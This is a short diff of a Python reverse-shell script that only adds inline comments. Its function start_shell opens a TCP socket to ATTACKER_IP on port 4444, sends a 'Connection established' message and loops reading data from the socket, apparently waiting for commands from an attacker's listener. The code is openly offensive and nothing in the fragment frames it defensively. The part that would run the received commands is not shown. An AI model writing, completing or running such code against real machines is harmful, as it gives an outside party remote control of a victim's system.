@@ -9,8 +9,8 @@ PORT = 4444
 def start_shell():
     try:
         # 1. Setup socket connection
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ATTACKER_IP, PORT))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#TCP Connection
+        s.connect((ATTACKER_IP, PORT))#connect to the ip's machine
 
         # 2. Send connection confirmation (Optional)
         s.sendall(b"Connection established.\n")
@@ -19,7 +19,7 @@ def start_shell():
         while True:
             # Wait for input from the listener (or local input relayed via JS)
             # For simplicity, we are just reading from the socket
-            data = s.recv(1024)
+            data = s.recv(1024)# receive data from the socket
             if not data:
                 break
 
